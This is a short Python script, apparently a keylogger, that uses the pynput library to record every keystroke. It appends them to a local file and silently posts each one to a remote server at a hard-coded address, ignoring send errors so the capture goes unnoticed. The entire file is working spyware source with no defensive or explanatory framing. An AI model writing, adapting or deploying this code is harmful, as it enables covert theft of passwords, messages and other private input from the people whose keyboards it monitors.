import requests
from pynput import keyboard
import os

SERVER_URL = "http://192.168.1.141:5000"

# Absolute path for log file
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "keylog.txt")

# Ensure log file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("")

# Map special keys to readable characters
special_keys = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: "<BACKSPACE>",
    keyboard.Key.shift: "",
    keyboard.Key.shift_r: "",
    keyboard.Key.ctrl_l: "<CTRL>",
    keyboard.Key.ctrl_r: "<CTRL>",
    keyboard.Key.alt_l: "<ALT>",
    keyboard.Key.alt_r: "<ALT>",
    keyboard.Key.esc: "<ESC>"
}

shift_pressed = False
buffer = ""

def send_log(data):
    """Send the keystrokes to the server"""
    if data:
        try:
            requests.post(SERVER_URL, json={"log": data}, timeout=1)
        except Exception:
            pass  # ignore errors if server is offline

def write_log(data):
    """Append keystrokes to local file"""
    if data:
        with open(LOG_FILE, "a") as f:
            f.write(data)

def on_press(key):
    global buffer, shift_pressed

    # Track Shift state
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = True
        return

    if hasattr(key, "char") and key.char is not None:
        char = key.char.upper() if shift_pressed else key.char
        buffer += char
    elif key in special_keys:
        if key == keyboard.Key.backspace:
            buffer = buffer[:-1]
        else:
            buffer += special_keys[key]

    send_log(buffer)
    write_log(buffer)
    buffer = ""

def on_release(key):
    global shift_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = False
    if key == keyboard.Key.esc:
        return False  # stop listener

# Start listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

